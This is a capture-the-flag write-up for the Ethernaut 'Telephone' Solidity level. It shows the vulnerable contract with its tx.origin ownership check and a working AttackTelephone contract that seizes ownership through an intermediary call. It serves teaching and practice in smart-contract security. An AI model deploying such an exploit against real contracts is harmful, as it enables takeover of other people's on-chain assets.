# Telephone 📞

Fourth Challenge description is as follows:

Claim ownership of the contract below to complete this level.
Things that might help

- See the Help page above, section "Beyond the console"

Code:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### Resolution

The goal of this challenge is to claim ownership of the contract, and we can see there's a method called `changeOwner`.

Now this method, has a particular condition: If the `tx.origin` is different from the `msg.sender` we can set a new owner.
Here's a difference between `tx.origin` and `msg.sender`:

_The tx. origin global variable refers to the **original external account that started the transaction** while msg. sender refers to the **immediate account (it could be external or another contract account)** that invokes the function._

So to claim ownership we need to create a transaction that executes the function `changeOwner` from a different sender. There's probably many ways to do this, but we could do it through a contract account.
We could deploy a `AttackTelephone` contract that calls the `changeOwner` from the `AttackTelephone` address and sets a new owner !

Here's a contract that does that!
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract AttackTelephone {
    
    address private telephoneAddress = {ETHERNAUT_TELEPHONE_CONTRACT_ADDRESS};
    address private sender = {YOUR_WALLET_ADDRESS};

    function changeOwnerOfTelephone() public {

        // Make an external call to the telephone contract address with abi.encodeWithSignature and pass the defined sender address as parameter:
        // In this case the tx.origin will be sender and msg.sender will be this contract address
         (bool success, ) = telephoneAddress.call(abi.encodeWithSignature("changeOwner(address)", sender));

         require(success, "Telephone fail or returned false!");
                  
    }
}
```

Once you successfully execute the `changeOwnerOfTelephone()` function, you can check the ownership via:
```
await contract.owner()
```
And that's it! You can submit your instance! 💥 

## License

[MIT](https://choosealicense.com/licenses/mit/)